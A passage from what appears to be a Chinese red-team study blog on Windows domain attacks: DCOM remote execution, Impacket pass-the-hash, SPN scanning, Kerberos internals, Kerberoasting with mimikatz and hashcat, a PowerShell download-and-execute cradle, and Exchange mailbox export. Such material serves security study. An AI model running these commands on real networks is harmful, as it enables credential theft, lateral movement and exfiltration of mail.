calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)或者[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902175207.png"></p><p>以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。</p><p>除了 MMC20.Application 和 ShellWindows，还有以下这几种 DCOM 对象可以被利用。</p><p>3、调用 Excel.Application 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.168.7.7&quot;))$com.DisplayAlerts &#x3D; $false$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、调用 ShellBrowserWindow 远程执行命令</p><blockquote><p>适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.7.7&quot;))$com.Document.Application.shellExecute(&quot;calc.exe&quot;)或者[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.3.144&quot;)).Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>5、调用 Visio.Application 远程执行命令</p><blockquote><p>前提是目标安装了 Visio</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;))$com.[0].Document.Application.shellExecute(&quot;calc.exe&quot;)或者[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;)).[0].Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6、调用 Outlook.Application 远程执行命令</p><blockquote><p>前提是目标安装了 Outlook</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;))$com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&quot;)或者[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dcomexec-py-脚本"><a href="#dcomexec-py-脚本" class="headerlink" title="dcomexec.py 脚本"></a>dcomexec.py 脚本</h3><p>Impacket 工具包里也提供了 DCOM 的利用脚本，该脚本可以提供一个类似于 wmiexec.py 脚本的半交互式 shell，不过使用的是 DCOM</p><p>dcomexec.py 脚本目前支持 MMC20.Application、ShellWindows 和 ShellBrowserWindow 对象。</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者只执行一条命令</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只知道 hash 也可以用 hash 去连接</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator@192.168.7.7 -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210904110328.png"></p><h1 id="0x24-SPN-的应用"><a href="#0x24-SPN-的应用" class="headerlink" title="0x24 SPN 的应用"></a>0x24 SPN 的应用</h1><h2 id="0、前言-5"><a href="#0、前言-5" class="headerlink" title="0、前言"></a>0、前言</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。</p><p>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN (Service Principal Name）</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos 是由 MIT 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端/服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。</p><p>在 Kerberos 认证中，最主要的问题就是如何证明「你是你」的问题，比如当一个用户去访问服务器上的某服务时，服务器如何判断该用户是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不会影响通讯的安全性，这正是 Kerberos 解决的问题。</p><p>Kerberos 协议中的名称解释：</p><ul><li>Client: 访问服务的客户端</li><li>Server: 提供服务的服务器</li><li>KDC (Key Distribution Center): 密钥分发中心</li><li>AS (Authentication Service): 认证服务器</li><li>TGS (Ticket Granting Service): 票据授予服务</li><li>DC (Domain Controller): 域控制器</li><li>AD (Account Database): 用户数据库</li><li>TGT (Ticket Granting Ticket): 票证授予票证</li><li>ST (Servre Ticket): 服务票据</li></ul><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906154732.png"></p><p>根据上图，这里一步一步进行解释</p><p><strong>第一阶段：Clinet 与 AS</strong></p><p>① 客户端向认证服务器 AS 发起请求，请求内容为自己的用户名、主机 IP 和当前时间戳。</p><p>② AS 接收到请求，此时 AS 会根据用户名在用户数据库 AD 中寻找，判断这个用户名在不在白名单里，此时只会查找具有相同用户名的用户，并不会判断身份的可靠性；如果没有该用户名，认证失败；如果存在该用户名，则 AS 便认为用户存在，此时 AS 对客户端做出响应，响应内容包含两部分：</p><ul><li>第一部分：票据授予票据 TGT，客户端需要使用 TGT 去密钥分发中心 KDC 中的票据授予服务 TGS 获取访问网络服务所需的票据，TGT 中包含的内容有 kerberos 数据库中存在的客户端信息、IP、当前时间戳 </li><li>第二部分：使用客户端密钥加密的一段内容，这段内容包括：用于客户端和 TGS 之间通信的 Session_Key (CT_SK) ，客户端即将访问的 TGS 信息以及 TGT 的有效时间和一个当前时间戳，该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。</li></ul><p>至此，第一阶段通信完成。</p><p><strong>第二阶段：Clinet 与 TGS</strong></p><p>此时客户端已经获取到了 AS 返回的消息，客户端会将 AS 返回的第二部分内容进行解密，分别获得时间戳、接下来要访问的 TGS 信息以及用于和 TGS 通信的密钥 CT_SK</p><p>首先客户端会判断时间戳与自己发出的时间差是否大于 5 分钟，如果大于 5 分钟那就认为这个 AS 是伪造的，认证失败，否则就继续准备向 TGS 发起请求。</p><p>③ 客户端向 TGS 发起请求，请求的内容包含三部分：</p><ul><li>第一部分：使用 CT_SK 加密的客户端信息、IP、时间戳</li><li>第二部分：自己想要访问的 Server 服务信息（明文形式）</li><li>第三部分：使用 TGS 密钥加密的 TGT</li></ul><p>④ TGS 接收到请求，首先判断当前系统是否存在客户端想要访问的 Server 服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p><pre><code>接下来 TGS 利用自己的秘钥解密 TGT 内容，此时 TGS 获取到经过 AS 认证后的用户信息、CT_SK、时间戳信息，通过时间戳判断此次请求时延是否正常，如果时延正常就继续下一步。之后 TGS 会使用 CT_SK 解密客户端发来的第一部分内容，取出其中的用户信息和 TGT 里的用户信息进行对比，如果全部一致则认为客户端身份正常，继续下一步。此时 TGS 将向客户端发起响应，响应信息包含两部分：</code></pre><ul><li>第一部分：使用服务端密码加密的服务票据 ST，其中包括客户端信息、IP、客户端待访问的服务端信息、ST 有效信息、时间戳以及用于客户端和服务端之间通信的 CS_SK</li><li>第二部分：使用 CT_SK 加密的内容，其中包括 CS_SK 、时间戳和 ST 的有效时间。</li></ul><p>至此，第二阶段通信完成。</p><p><strong>第三阶段：Clinet 与 Server</strong></p><p>此时客户端收到来自 TGS 的响应，并使用本地缓存的 CT_SK 解密出 TGS 返回的第二部分内容，检查时间戳无误后，取出 CS_SK 准备向服务端发起请求。这里由于 TGS 返回的第一部分信息是用的服务端秘钥加密的，因此这里的客户端是无法进行解密的。</p><p>⑤ 客户端向服务端发送请求，请求内容包括两部分：</p><ul><li>第一部分：利用 CS_SK 将自己的主机信息和时间戳进行加密的信息</li><li>第二部分：第 ④ 步里 TGS 向客户端返回的第一部分内容，即使用服务端密码加密的服务票据 ST</li></ul><p>⑥ 服务端此时收到了来自客户端的请求，它会使用自己的密钥解密客户端发来的第二部分内容，核对时间戳之后，取出 CS_SK，利用 CS_SK 解密第一部分内容，从而获得经过 TGS 认证后的客户端信息。</p><p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用 CS_SK 加密的表示接受的信息，客户端接受到信息后也确认了服务端的真实性。</p><p>至此，第三阶段通信完成，到这里整个 kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p><p>这里可以再通过时序图加深下印象。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906174237.jpg"></p><p>注意点：</p><ul><li>KDC 服务默认会安装在一个域的域控中</li><li>Kerberos 认证采用对称加密算法</li><li>三个阶段里都使用了密钥，这些密钥都是临时生成的，也只在一次会话中生效，因此即使密钥被劫持，等到密钥被破解可能这次会话也都早已结束。</li><li>AD 其实是一个类似于本机 SAM 的一个数据库，全称叫 Account Database，存储所有 Client 白名单，只有存在于白名单的 Client 才能顺利申请到 TGT</li><li>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为它就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li></ul><h2 id="1、SPN"><a href="#1、SPN" class="headerlink" title="1、SPN"></a>1、SPN</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>在使用 Kerberos 协议进行身份验证的网络中，必须在内置账号（NetworkService、LocalSystem）或者用户账号下为服务器注册 SPN。</p><p>对于内置账号，SPN 将自动进行注册，如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN。</p><p>因为域环境中的每台服务器都需要在 Kerberos 身份验证服务中注册 SPN ，所以 RT 会直接向域控制器发送查询请求，获取需要的服务的 SPN ，从而知道自己需要使用的服务资源在哪台机器上。</p><p>SPN 格式如下：</p><pre class="line-numbers language-none"><code class="language-none">serviceclass &quot;&#x2F;&quot; hostname [&quot;:&quot;port] [&quot;&#x2F;&quot; servicename]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>serviceclass（必选）：服务组件名称</p><p>hostname（必选）：以 “/” 与后面的名称分隔，这里的 hostname 是计算机的 FQDN (全限定域名，同时带有计算机名和域名)</p><p>port（可选）：以冒号分隔，后面的内容为该服务监听的端口号</p><p>servicename（可选）：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名</p></blockquote><h3 id="常见-SPN-服务"><a href="#常见-SPN-服务" class="headerlink" title="常见 SPN 服务"></a>常见 SPN 服务</h3><p>MSSQL 服务</p><pre class="line-numbers language-none"><code class="language-none">MSSQLSvc&#x2F;DBServer.teamssix.com:1433<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exchange 服务</p><pre class="line-numbers language-none"><code class="language-none">exchangeMDB&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>RDP 服务</p><pre class="line-numbers language-none"><code class="language-none">TERMSRV&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>WSMan/WinRM/PSRemoting 服务</p><pre class="line-numbers language-none"><code class="language-none">WSMAN&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SPN-扫描脚本"><a href="#SPN-扫描脚本" class="headerlink" title="SPN 扫描脚本"></a>SPN 扫描脚本</h3><p>SPN 扫描也叫「扫描 Kerberos 服务实例名称」，在活动目录中发现服务的最佳方法就是 SPN 扫描。</p><p>SPN 扫描通过请求特定 SPN 类型的服务主体名称来查找服务，与网络端口相比，SPN 扫描的主要特点是不需要通过连接网络中的每个 IP 地址来检查服务端口，因此不会因触发内网中的安全设备规则而产生大量的告警日志。</p><p>由于 SPN 查询是 Kerberos 票据行为的一部分，所以检测难度较大。</p><h4 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h4><p>setspn 是 Windows 自带命令，以下命令可列出域中所有的 SPN 信息</p><pre class="line-numbers language-none"><code class="language-none">setspn -T teamssix -Q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Active-Directory-模块"><a href="#Active-Directory-模块" class="headerlink" title="Active Directory 模块"></a>Active Directory 模块</h4><p>PowerShell 模块 Active Directory 只在域控上有</p><pre class="line-numbers language-none"><code class="language-none">Import-Module ActiveDirectoryget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用大佬导出的模块，这样普通用户也可以使用该模块，下载地址：<a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Microsoft.ActiveDirectory.Management.dllget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>PowerView 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Powershell-AD-Recon"><a href="#Powershell-AD-Recon" class="headerlink" title="Powershell-AD-Recon"></a>Powershell-AD-Recon</h4><p>Powershell-AD-Recon 提供了一系列获取服务与服务登录账号和运行服务的主机之间的对应关系的工具，这些服务包括但不限于 MSSQL、Exchange、RDP、WinRM</p><p>Powershell-AD-Recon 下载地址：<a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p><p>Powershell-AD-Recon 工具包里的内容如下：</p><pre class="line-numbers language-none"><code class="language-none">Discover-PSInterestingServices# 查找所有 SPN 服务Discover-PSMSExchangeServers# 查找 Exchange 服务器Discover-PSMSSQLServers         # 查找 MSSQL 服务器Find-PSServiceAccounts          # 查找服务账户Get-DomainKerberosPolicy        # 获取域 Kerberos 策略Get-PSADForestInfo              # 获取域森林信息Get-PSADForestqInfo             # 获取域森林 KRBTGT 信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>下载后的文件是没有 .ps1 后缀的，需要自己添加上</p></blockquote><p>由于 SPN 是通过 LDAP 协议向域控制器进行查询的，因此 RT 需要获得一个普通的域用户权限才可以进行 SPN 扫描。</p><p>将 PowerShell 脚本导入并执行，以 MSSQL 服务为例</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSMSSQLServers.ps1Discover-PSMSSQLServers或者PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSMSSQLServers.ps1;Discover-PSMSSQLServers&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描域中所有的 SPN 信息</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSInterestingServices.ps1Discover-PSInterestingServices或者PowerShell -Exec bypass -C &quot;Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="kerberoast"><a href="#kerberoast" class="headerlink" title="kerberoast"></a>kerberoast</h4><p>kerberoast 工具包里的 GetUserSPNs.ps1，可以帮助我们发现仅与用户帐户相关联的服务。</p><p>kerberoast 下载地址：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;GetUserSPNs.ps1或者PowerShell -Exec bypass -File GetUserSPNs.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>kerberoast 工具包里的 GetUserSPNs.vbs 也能实现相同的功能</p><pre class="line-numbers language-none"><code class="language-none">cscript.exe GetUserSPNs.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="PowerShellery"><a href="#PowerShellery" class="headerlink" title="PowerShellery"></a>PowerShellery</h4><p>PowerShellery 工具包里包含了 Get-SPN，可以为各种服务收集 SPN</p><p>PowerShellery 下载地址：<a href="https://github.com/nullbind/Powershellery">https://github.com/nullbind/Powershellery</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search *或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search *&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果也可以转换为表格的形式，以便于浏览</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-SPN.psm1Get-SPN -type service -search * -List yes或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-SPN.psm1;Get-SPN -type service -search * -List yes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外一个 Get-DomainSpn.psm1 脚本可以用来获取 UserSID、服务和实际用户</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-DomainSpn.psm1Get-DomainSpn或者PowerShell -Exec bypass -C &quot;Import-Module .\Get-DomainSpn.psm1;Get-DomainSpn&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>Impacket 下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>上面的工具都是在域内的机器里扫描 SPN 的，利用 impacket 工具包下的 GetUserSPNs.py 可以在非域主机中扫描目标的 SPN</p><pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -dc-ip 192.168.7.7 teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210906144640.png"></p><h2 id="2、kerberoast"><a href="#2、kerberoast" class="headerlink" title="2、kerberoast"></a>2、kerberoast</h2><p>kerberoast 是一种针对 Kerberos 协议的利用方式，在因为需要使用某个特定资源而向 TGS 发送 Kerberos 服务票据的请求时，用户首先需要使用具有有效身份权限的 TGT 向 TGS 请求相应服务的票据。</p><p>当 TGT 被验证有效且具有该服务的权限时，TGS 会向用户发送一张票据。该票据使用与 SPN 相关联的计算机服务账号的 NTLM Hash（RC4_HMAC_MD5），就是说，RT 会通过 Kerberoast 尝试使用不同的 NTLM Hash 来打开该 Kerberos 票据，如果 RT 使用的 NTLM Hash 是正确的，Kerberos 票据就会被打开，而该 NTLM Hash 对应于该计算机服务账号的密码。</p><p>kerberoast 的利用思路：</p><p>1、查询 SPN 寻找在 Users 下并且是高权限域用户的服务</p><p>2、请求并导出 TGS</p><p>3、对 TGS 进行爆破</p><p>这里以 MSSQL 服务为例，并尝试破解该服务的票据</p><p>手动注册 SPN</p><pre class="line-numbers language-none"><code class="language-none">setspn -A MSSQLSvc&#x2F;DBSRV.teamssix.com:1433 test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看用户所对应的 SPN</p><pre class="line-numbers language-none"><code class="language-none">setspn -L teamssix.com\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用 adsiedit.msc 查看用户 SPN 及其他高级属性</p><p>为用户配置指定服务的登录权限，gpedit.msc 打开本地组策略编辑器，找到以下路径，将用户添加进去，例如这里添加的用户为 test</p><pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\用户权限分配\作为服务登录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为 Kerberos 协议的默认加密方式是 AES256_HMAC，而通过 tgsreperack.py 脚本无法破解该加密方式，因此我们可以通过组策略将加密方式设置为 RC_HMAC_MD5</p><p>在本地组策略编辑器中，找到以下路径，将加密方式设置为 RC_HMAC_MD5</p><pre class="line-numbers language-none"><code class="language-none">\计算机配置\Windows 设置\安全设置\本地策略\安全选项\网络安全：配置 Kerberos 允许的加密类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>请求指定 SPN 的服务票据</p><pre class="line-numbers language-none"><code class="language-none">$SPNName &#x3D; &#39;MSSQLSvc&#x2F;DBSRV.teamssix.com&#39;Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者请求所有服务的服务票据</p><pre class="line-numbers language-none"><code class="language-none">Add-Type -AssemblyName System.IdentityModel  setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以使用 klist 查看本地缓存的票证，看看有没有新的票据</p><p>之后在 mimikatz 中执行如下命令，将内存中的票据导出</p><pre class="line-numbers language-none"><code class="language-none">kerberos::list &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以不使用 mimikatz，使用 powershell 脚本导出支持 hashcat 破解的格式</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;EmpireProject&#x2F;Empire&#x2F;6ee7e036607a62b0192daed46d3711afc65c3921&#x2F;data&#x2F;module_source&#x2F;credentials&#x2F;Invoke-Kerberoast.ps1&#39;);Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 Rubeus 获取票据</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用 impacket 获取票据</p><pre class="line-numbers language-none"><code class="language-none">python3 GetUserSPNs.py -request -dc-ip 192.168.7.7 -debug teamssix.com&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113159.png"></p><p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash</p><p>Kerberoast 脚本下载地址：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><pre class="line-numbers language-none"><code class="language-none">python tgsreperack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113300.png"></p><h1 id="0x25-Exchange-邮件服务器"><a href="#0x25-Exchange-邮件服务器" class="headerlink" title="0x25 Exchange 邮件服务器"></a>0x25 Exchange 邮件服务器</h1><h2 id="1、Exchange-的基本操作"><a href="#1、Exchange-的基本操作" class="headerlink" title="1、Exchange 的基本操作"></a>1、Exchange 的基本操作</h2><blockquote><p>在 Exchange 服务器上的 PowerShell 里进行以下操作</p></blockquote><p>将 Exchange 管理单元添加到当前会话中</p><pre class="line-numbers language-none"><code class="language-none">add-pssnapin microsoft.exchange*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看邮件数据库</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -server &quot;dc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询数据库的物理路径</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -Identity &#39;Mailbox Database 0761701514&#39; | Format-List Name,EdbFilePath,LogFolderPath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取现有用户的邮件地址</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox | Format-table Name,WindowsEmailAddress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看指定用户的邮箱使用信息</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailboxstatistics -Identity Administrator | Select Dispayname,ItemCount,TotalItemSize,TotalTimeSize,LastLogonTime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取用户邮箱中的邮件数量，通过该命令还可以列出那些用户未登录过邮箱</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -ResultSize Unlimited | Get-Mailboxstatistics | Sort-Object TotalItemSize -Descend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、导出指定的电子邮箱"><a href="#2、导出指定的电子邮箱" class="headerlink" title="2、导出指定的电子邮箱"></a>2、导出指定的电子邮箱</h2><p>Exchange Server 2007 中需要使用 ExportMailBox 命令，在 Exchange Server 2010 SP1 及以后的版本中可以使用图形化界面导出，也可以使用 PowerShell</p><p>如果想要导出 PTS 格式的邮件文件，则需要为用户配置导出/导出权限。</p><h3 id="配置用户的导入导出权限"><a href="#配置用户的导入导出权限" class="headerlink" title="配置用户的导入导出权限"></a>配置用户的导入导出权限</h3><p>查看用户权限</p><pre class="line-numbers language-none"><code class="language-none">Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 Administrator 用户添加到 Mailbox Import Export  角色组里，将用户添加到角色组后，需要重启 Exchange 服务才能执行导出操作</p><pre class="line-numbers language-none"><code class="language-none">New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除刚刚添加的 Mailbox Import Export 角色组中的用户</p><pre class="line-numbers language-none"><code class="language-none">Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置网络共享文件夹"><a href="#设置网络共享文件夹" class="headerlink" title="设置网络共享文件夹"></a>设置网络共享文件夹</h3><p>不论使用哪种方式导出邮件，都需要将文件放置在 UNC（Universal Naming Convention，通用命名规则，也称通用命名规范）路径下</p><p>类似于 “\hostname\sharename”、“\ipaddress\sharename” 的网络路径下，sharename 为网络共享名称。</p><p>首先开启共享，将 C 盘 inetpub 文件夹设置为 everyone 可读写，执行如下命令：</p><pre class="line-numbers language-none"><code class="language-none">net share inetpub&#x3D;c:\inetpub &#x2F;grant:everyone,full<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="导出用户的电子邮件"><a href="#导出用户的电子邮件" class="headerlink" title="导出用户的电子邮件"></a>导出用户的电子邮件</h3><p>使用 PowerShell 导出电子邮件，用户的电子邮箱目录一般为Inbox（收件箱）、SentItems（已发送邮件）、DeleteItems（已删除邮件）、Drafts（草稿）等</p><pre class="line-numbers language-none"><code class="language-none">New-MailboxExportRequest -Mailbox administrator -FilePath \\192.168.7.77\inetpub\administrator.pst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用图形化界面导出电子邮件，访问 <a href="https://127.0.0.1/ecp%EF%BC%8C%E6%89%93%E5%BC%80">https://127.0.0.1/ecp，打开</a> Exchange 管理中心的登录界面。</p><p>输入账号密码进入 Exchange 管理中心，点击「…」更多按钮，选择「导出到 PST 文件」即可进行导出操作。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908104558.png"></p><h3 id="管理导出请求"><a href="#管理导出请求" class="headerlink" title="管理导出请求"></a>管理导出请求</h3><p>不论是通过 Powershell 